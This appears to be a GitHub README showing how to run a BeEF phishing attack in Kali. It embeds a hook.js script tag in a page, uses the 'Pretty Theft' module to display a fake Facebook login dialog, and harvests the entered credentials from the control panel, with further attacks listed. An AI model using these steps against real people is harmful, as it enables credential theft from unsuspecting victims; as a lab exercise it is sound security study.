# Social-Engineering-Attack-with-Beef
Beef is a framework to create phishing websites that can be sent to a victim to steal their credentials

## Prerequisites

In Kali, search for the application and run beef. This should open a command line that should prompt for an input of the username and/or password.

## Running the Attack

1. In a html page embed the beef script: Example:
``
<html>
    <head>
    <title>
        Example BeEF hooked page
    </title>
    </head>
    <body>
        <p>This page should be running the hook script for BeEF</p>
        <script src="http://127.0.0.1:3000/hook.js"></script>
    </body>
</html>
2. Run the apache2 by ``sudo service apache2 start``
3. Within the BeEF Control panel, this should show that an online browser has been hooked. 

![image](https://user-images.githubusercontent.com/39514108/152269172-2449270c-d5c7-4b5c-ae0c-2def95cec14c.png)
4. In the Beef control panel click: Commands-> Social Engineering -> Pretty Theft -> Execute. This shoudl generate a fake page according to the dialog type. For example using Facebook: 

![image](https://user-images.githubusercontent.com/39514108/152269440-6e5328db-4594-4b29-9772-92c6fd8c7a20.png)
This displays the following dialog on the victim's page: 
![image](https://user-images.githubusercontent.com/39514108/152269473-2f010c7b-9051-480b-8477-c357cfe1f215.png)

6. Enter in Fake Credentials

![image](https://user-images.githubusercontent.com/39514108/152269525-24745bdf-1851-4db3-9fdf-51435523a11e.png)

7. Harvest the credentials by navigating back to the beef control panel and click on the command to view the results. 

![image](https://user-images.githubusercontent.com/39514108/152269606-0603389a-f65c-41ed-b0e5-5660b0b8793a.png)

## Other Attacks
1. Fake Notifications
![image](https://user-images.githubusercontent.com/39514108/152269698-21826f19-a9bc-4bd1-a574-54f226604b1f.png)
2. Click Hijacking 

![image](https://user-images.githubusercontent.com/39514108/152269797-4cb5aa9f-1254-46e4-b985-e875a5fc94a1.png)

3. Google Phishing

![image](https://user-images.githubusercontent.com/39514108/152269873-65b931a4-0bfe-4b10-955a-50de20097e62.png)


